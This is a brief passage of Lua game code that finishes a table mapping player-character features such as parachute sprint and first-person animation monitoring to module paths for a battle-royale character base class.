    ParachuteSprint = "GameLua.Mod.BaseMod.GamePlay.Feature.Parachute.ParachuteSprintFeature"
  },
  {
    GeneralShowSpotFeature = "GameLua.Mod.BRMod.Gameplay.Feature.PlayerCharacterGeneralShowSpotFeature"
  },
  {
    FPPAnimMonitor = "GameLua.Mod.BaseMod.GamePlay.Feature.Player.FPPAnimMonitorFeature"
  }
}, "BRPlayerCharacterBase")
